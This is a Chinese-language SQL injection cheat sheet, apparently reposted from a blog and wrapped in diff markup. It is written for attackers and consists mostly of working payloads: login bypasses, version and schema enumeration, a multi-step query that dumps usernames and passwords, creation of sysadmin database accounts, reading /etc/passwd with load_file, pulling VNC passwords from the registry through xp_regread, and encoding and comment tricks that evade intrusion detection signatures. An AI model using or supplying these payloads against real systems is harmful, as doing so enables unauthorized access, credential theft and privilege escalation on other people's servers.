@@ -1,0 +1,298 @@
+SQL注射技术汉化版
+转自；http://nb.2sb.cn/?p=54 
+作者：深灰色
+====||目录||=====
+
+——————–
+
+1、简介
+
+2、漏洞测试
+
+3、收集信息
+
+4、数据类型
+
+5、抓取密码
+
+6、创建数据库帐号
+
+7、MYSQL利用
+
+8、服务名和配置
+
+9、在注册表中找VNC密码
+
+10、刺穿IDS认证
+
+11、在MYSQL中使用char()欺骗
+
+12、用注释躲避IDS认证
+
+13、构造无引号的字符串
+
+
+
+====||文章开始||====
+
+1、简介
+
+当你看到一个服务器只开了80端口，这在一定程度上说明管理员把系统的补丁做的很好，我们所要做最有效的攻击则也应该转向WEB攻击。SQL注射是最常用的攻击方式。你攻击WEN系统（ASP，PHP，JSP，CGI等）比去攻击系统或者其他的系统服务要简单的多。
+
+SQL注射是通过页面中的输入来欺骗使得其可以运行我们构造的查询或者别的命令，我们知道在WEB上面有很多供我们输入参数的地方，比如用户名、密码或者E_mail。
+
+
+
+2、漏洞测试
+
+最开始我们应该从最简单的来试：
+
+- Login:’ or 1=1–
+
+- Pass:’ or 1=1–
+
+- http://website/index.asp?id=’ or 1=1–
+
+还有下面这样的方式：
+
+- ‘ having 1=1–
+
+- ‘ group by userid having 1=1–
+
+- ‘ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘tablename’)–
+
+- ‘ union select sum(columnname) from tablename–
+
+
+
+3、收集信息
+
+- ‘ or 1 in (select @@version)–
+
+- ‘ union all select @@version–
+
+上面就可以得到系统的版本和补丁信息。
+
+
+
+4、数据类型
+
+Oracle数据库>>
+
+–>SYS.USER_OBJECTS (USEROBJECTS)
+
+–>SYS.USER_VIEWS
+
+–>SYS.USER_TABLES
+
+–>SYS.USER_VIEWS
+
+–>SYS.USER_TAB_COLUMNS
+
+–>SYS.USER_CATALOG
+
+–>SYS.USER_TRIGGERS
+
+–>SYS.ALL_TABLES
+
+–>SYS.TAB
+
+MySQL数据库
+
+–>mysql.user
+
+–>mysql.host
+
+–>mysql.db
+
+
+
+MS access数据
+
+–>MsysACEs
+
+–>MsysObjects
+
+–>MsysQueries
+
+–>MsysRelationships
+
+
+
+MS SQL Server数据库
+
+–>sysobjects
+
+–>syscolumns
+
+–>systypes
+
+–>sysdatabases
+
+
+
+5、抓取密码
+
+用类似下面的语句。。。
+
+//保存查询的结果
+
+step1 : ‘; begin declare @var varchar(8000) set @var=’:’ select @var=@var+’+login+’/'+password+’ ‘ from users where login > @var select @var as var into temp end –
+
+//取得信息
+
+step2 : ‘ and 1 in (select var from temp)–
+
+//删除临时表
+
+step3 : ‘ ; drop table temp –
+
+
+
+6、创建数据库帐号
+
+MS SQL
+
+exec sp_addlogin ‘name’ , ‘password’
+
+exec sp_addsrvrolemember ‘name’ , ’sysadmin’
+
+
+
+MySQL
+
+INSERT INTO mysql.user (user, host, password) VALUES (’name’, ‘localhost’, PASSWORD(’pass123′))
+
+
+
+Access
+
+CRATE USER name IDENTIFIED BY ‘pass123′
+
+
+
+Postgres (requires Unix account)
+
+CRATE USER name WITH PASSWORD ‘pass123′
+
+
+
+Oracle
+
+CRATE USER name IDENTIFIED BY pass123
+
+        TEMPORARY TABLESPACE temp
+
+         DEFAULT TABLESPACE users;
+
+GRANT CONNECT TO name;
+
+GRANT RESOURCE TO name;
+
+
+
+7、MYSQL交互查询
+
+使用Union查询，暴出文件代码，如下：
+
+- ‘ union select 1,load_file(’/etc/passwd’),1,1,1;
+
+
+
+8、系统服务名和配置
+
+- ‘ and 1 in (select @@servername)–
+
+- ‘ and 1 in (select servername from master.sysservers)–
+
+
+
+9、找到VNC密码（注册表）
+
+实验语句如下：
+
+- ‘; declare @out binary(8)
+
+- exec master..xp_regread
+
+- @rootkey = ‘HKEY_LOCAL_MACHINE’,
+
+- @key = ‘SOFTWARE\ORL\WinVNC3\Default’,
+
+- @value_name=’password’,
+
+- @value = @out output
+
+- select cast (@out as bigint) as x into TEMP–
+
+- ‘ and 1 in (select cast(x as varchar) from temp)–
+
+
+
+10、避开IDS检测
+
+Evading ‘ OR 1=1 Signature
+
+
+
+- ‘ OR ‘unusual’ = ‘unusual’
+
+- ‘ OR ’something’ = ’some’+'thing’
+
+- ‘ OR ‘text’ = N’text’
+
+- ‘ OR ’something’ like ’some%’
+
+- ‘ OR 2 > 1
+
+- ‘ OR ‘text’ > ‘t’
+
+- ‘ OR ‘whatever’ in (’whatever’)
+
+- ‘ OR 2 BETWEEN 1 and 3
+
+
+
+11、MYSQL中使用char()函数
+
+不带引号的注射，例如： (string = “%”):
+
+–> ‘ or username like char(37);
+
+带引号的注射，例如： (string=”root”):
+
+–> ‘ union select * from users where login = char(114,111,111,116);
+
+在 unions中使用load files 函数，例如：(string = “/etc/passwd”):
+
+–>’ union select 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+
+检查文件是否存在，例如： (string = “n.ext”):
+
+–>’ and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+
+
+12、利用注释符号避开IDS
+
+举例如下：
+
+–>’/**/OR/**/1/**/=/**/1
+
+–>Username:’ or 1/*
+
+–>Password:*/=1–
+
+–>UNI/**/ON SEL/**/ECT （！！！这个比较罕见，应该大有作为！！！）
+
+–>(Oracle)     ‘; EXECUTE IMMEDIATE ‘SEL’ || ‘ECT US’ || ‘ER’
+
+–>(MS SQL)    ‘; EXEC (’SEL’ + ‘ECT US’ + ‘ER’)
+
+
+
+13、不带引号的字符串
+
+用char()或者0X来构造不含引号的语句。。
+
+–> INSERT INTO Users(Login, Password, Level) VALUES( char(0×70) + char(0×65) + char(0×74) + char(0×65) + char(0×72) + char(0×70) + char(0×65) + char(0×74) + char(0×65) + char(0×72), 0×64) 
